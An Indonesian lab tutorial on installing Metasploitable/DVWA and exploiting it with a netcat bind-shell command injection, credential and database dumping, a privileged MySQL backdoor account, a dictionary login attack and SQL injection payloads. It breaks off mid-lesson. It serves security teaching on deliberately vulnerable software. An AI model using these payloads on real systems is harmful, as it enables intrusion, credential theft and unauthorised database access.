#DVWA
DVWA adalah perangkat lunak berbasis website yang didesain memiliki celah agar dapat digunakan untuk berlatih. Dalam hal ini akan digunakan DVWA sebagai eksploitable platform dan kali linux host yang akan kita gunakan untuk mengeksploit.
##Instalasi DVWA
1. Pertama kita harus memiliki metasploitable
![](metasploitable.PNG)
2. Setelah itu, kita ekstrak
![](ekstrakmetasploitable.PNG)
3. Lalu kita buka folder metasploitable tersebut
![](isimetasploitable.PNG)
4. Selanjutnya kita jalankan program virtualbox dan buat virutal mesin baru lalu kita beri nama "metasploitable"
![](buatmetasploitable.PNG)
5. Setelah itu kita diminta memasukkan besar memory
![](memory.PNG)
6. Setelahnya kita diminta memilih mekanisme hardisk yang kita gunakan. Kita akan menggunakan pilihan ketiga lalu klik tombol folder di sebelah kanan  
![](mekanismehardisk.PNG)
7. Apabila tombol folder kita klik, maka akan muncul popup untuk memilih virtual disk. Kita pilih virtual disk metasploitable yang ada pada step 3.
![](pilihmetasploitable.PNG)
8. Apabila kita sudah memilih, tampilan akan menjadi seperti dibawah ini lalu kita klik buat
![](setelahpilih.PNG)
9. Apabila berhasil, maka virtual mesin dengan nama "metasploitable" akan muncul pada daftar virtual mesin
![](daftarmesin.PNG)
10. Selanjutnya buka pengaturan jaringan pada virtual mesin yang baru saja kita buat. Kita pilih "Adaptor Ter-bridge" pada pilihan "Terpasang pada:"
![](pengaturanjaringan.PNG)
11. Jalankan virtual mesin yang baru saja kita buat. Lalu kita masuk dengan menggunakan username: **msfadmin** dan password: **msfadmin**
![](metasploitablelogin.PNG)
12. Apabila kita berhasil login akan muncul tampilan seperti di bawah ini
![](metasploitablelandingpage.PNG)
13. Ketikkan **ifconfig** untuk mengetahui ip dari metasploitable yang telah kita buat. Dari gambar dibawah ini dapat kita lihat bahwa metasploitable kita mendapatkan ip **192.168.1.28**
![](ipmetasploitable.PNG)
14. Kita bisa mengakses metasploitable yang kita bangun dengan cara mengetikkan alamat ip dari metasploitable yang kita buat. Dalam hal ini ip metasploitable kita adalah **192.168.1.28**
![](bukadvwa.PNG)
15. Setelah itu kita diarahkan ke sebuah halaman yang berisi daftar modul metasploitable. Dalam hal ini kita hanya akan menggunakan dvwa. Kita klik **DVWA**
![](moduldvwa.PNG)
16. Selanjutnya kita akan diarahkan ke halaman login DVWA
![](logindvwa.PNG)

##Eksploit DVWA
## Lesson 4(Using Metasploit with Command Execution)
Pada bagian ini kita akan belajar mengenai **Command Execution**. Dengan **Command Execution** memungkinkan penyerang untuk mengeksekusi perintah melalui bash   
1. Login DVWA. Default username: **admin** dan password: **password**.  
![login](logindvwa.PNG)  
2. Ubah tingkat kesulitan pada DVWA menjadi low
![ubah tingkat kesulitan](dvwasecurity.PNG)
3. Pilih "command execution" pada bar navigasi
![](4/beranda.PNG)
4. Masukkan **192.168.1.28;mkfifo /tmp/pipe;sh /tmp/pipe | nc -l -p 4444 > /tmp/pipe** . Perintah tersebut akan membuka netcat session yang terhubung dengan bash
![](4/inputvulnerable.PNG) 
5. Selanjutnya kita buka metasploit framework pada kali linux
![](4/metasploit.PNG)
6. Apabila berhasil login akan muncul tampilan seperti di bawah ini. Pada gambar sudah terdapat syntax untuk terhubung dengan netcat session yang telah kita buat pada step 4.  
![](4/metasploitlogged.PNG)
7. Apabila terhubung kita dapat menggunakan shell dvwa seperti pada gambar di bawah ini
![](4/usercredential.PNG)
pada gambar diatas dapat diketahui current working directory dan credential kita  
8. Pada step 7 dapat kita ketahui bahwa kita berada di directory **/var/www/dvwa/vulnerabilities/exec**. Lalu kita coba akses folder **/var/www/dvwa** yang merupakan root dari dvwa dengan perintah **"cd ../.."**
![](4/dvwafolder.PNG)
9. Selanjutnya kita buka folder **config** dan gunakan perintah **cat config.inc.php** untuk mengetahui konfigurasi dbms
![](4/config.PNG)
pada gambar diatas terlihat bahwa user yang digunakan untuk mengakses dbms adalah **root** dan passwordnya adalah **''** atau kosong  
10. Kita memberikan query untuk melihat semua database ke mysql. Query: **echo "show databases;" | mysql -u root --password=""**
![](4/showdatabases.PNG)  
11. Selanjutnya kita bisa melihat daftar table yang ada pada databse dvwa. Query: **echo "use dvwa; show tables;" | mysql -u root --password=""** 
![](4/showtables.PNG)  
12. Selanjutnya kita coba melihat daftar user pada tabel users di database dvwa. Query: **echo "select * from dvwa.users;" | msql -u root --password=""**
![](4/selectusers.PNG)  
13. Selanjutnya kita coba memasukkan record baru. Query: **echo "insert into dvwa.users values(6, 'kelompok', '11', 'kelompok11', MD5('kelompok11'), 'NA');"|mysql -u root --password=""**
![](4/insertusers.PNG)
14. Pada step 10 kita dapat melihat terdapat database **mysql**. Kita coba melakukan melihat tabel yang ada pada database mysql. Query: **echo "use mysql; show tables;"|mysql -u root --password=""**
![](4/showmysqltables.PNG)
15. Selanjutnya kita coba menambahkan user baru. Query: **echo "use mysql; GRANT ALL PRIVILEGES ON *.* TO 'db_hacker'@'%' IDENTIFIED BY 'abc123' WITH GRANT OPTION;" | mysql -u root --password=""**
![](4/insertusersmysql.PNG)

##Lesson 5(Using Tamper Data with crack\_web_form.pl)
Pada sesi kali ini kita akan mencoba mengeksploitasi celah pada login DVWA. Kita akan coba melakukan dictionary attack. Kita akan menggunakan tamper data untuk mengetahui request yang kita kirimkan dan cwf yang akan kita gunakan untuk melakukan dictionary attack berdasarkan detil yang telah kita peroleh dari tamper data.  
1. Pertama-tama kita harus menampabahkan plugin tamper data pada browser kita
![](5/installtamperdata.PNG)
![](5/installtamperdata2.PNG)
2. Lalu jalankan tamper data melalui menu tools pada sisi atas browser
![](5/tamperdatatools.PNG)
3. Selanjutnya kita buka halaman login DVWA. Dan masukkan username: **wew**, password: **wew**. Maka akan muncul tulisan **Login failed** yang berarti username dan password kita yang kita masukkan salah.
![](5/loginfailed.PNG)
4. Lalu kita buka tamper data yang telah kita jalankan. Terdapat beberapa request. Kita pilih yang merupakan login kita ke aplikasi dvwa.  
![](5/tamperberhasil.PNG)
5. Selanjutnya kita buat sebuah folder untuk menampung program yang akan kita gunakan untuk mengeksploit  
![](5/buatfoldercwf.PNG)
6. Selanjutnya kita download program yang akan gunakan untuk melakukan eksploit dan letakkan di dalam folder yang telah kita buat. Program dapat kita download di: **www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson5/cwf.tar.gz**  
![](5/downloadcwf.PNG)
7. Lalu ekstrak file yang telah kita download. Di dalamnya kita akan menemukan 2 buah file, satu file untuk melakukan eksploit dan satu file sebagai dictionary  
![](5/hasilekstrakcwf.PNG)
8. Kita dapat menggunakan program tersebut dengan perintah: **./crack\_web_form.pl -U admin -P password.txt -http "http://192.168.1.28/dvwa/login.php" -data "username=USERNAME&password="PASSWORD"&Login=Login" -M "Login failed** dimana:  
	- -U digunakan untuk menentukan username. Kita tentukan usernamenya adalah **admin** dengan asumsi kita akan mencoba dengan username **admin**  
	- -P untuk menentukan dictionary yang kita pakai  
	- -http untuk menentukan url  
	- -data untuk menentukan data yang kita dapat dari tamper data  
	- -M untuk menentukan pesan error  
![](5/cwfsyntax.PNG)
9. Selanjutnya apabila kita jalankan perintah pada step 8, maka proses eksploit akan dimulai dan apabila berhasil program akan menampilkan pesan **success** dan menghentikan proses  
![](5/cwfberhasil.PNG)  
dapat kita lihat bahwa username yang benar adalah **admin** dan password yang benar adalah **password**

##Lesson 6(SQL Injection)
Sql injection adalah penyerangan dengan memanfaatkan celah pada mysql. Celah tersebut memungkinkan kita menjalankan perintah ke mysql hanya dengan memasukkannya pada form masukkan yang tersedia.  
1. Pertama pada navigasi DVWA kita pilih sqlinjection  
![](6/sqlinjectionberanda.PNG)
2. Kita coba sembarang input  
![](6/sqlinjectionbasic.PNG)
pada bagian diatas memperlihatkan bahwa dvwa menampilkan id, firstname dan Surname. Namun php query yang akan kita eksploit adalah **$getid "SELECT first\_name, last\_name FROM users WHERE user\_id = '$id'";**. Id pada hasil query adalah id yang kita masukkan melalui input. Dvwa tidak benar benar melakukan query untuk menampilkan ID.  
3. Selanjutnya kita coba sql injection basic menggunakan query **%' or '1'='1'** yang akan mereturn semua record karena pernyataan **'1'='1'** selalu benar. Query yang akan kita berikan ke database adalah **$getid = "SELECT first\_name, last\_name FROM users WHERE user\_id = '%' or '1'='1'";**  
![](6/alwaystrue.PNG)
4. Selanjutnya kita dapat menggunakan melihat versi dari daabase dengan syntax **%' or 0=0 union select null, version() #**  
![](6/databaseversion.PNG)  
dapat kita lihat bahwa record paling bawah pada bagian Surname menampilkan versi dari database.  
5. 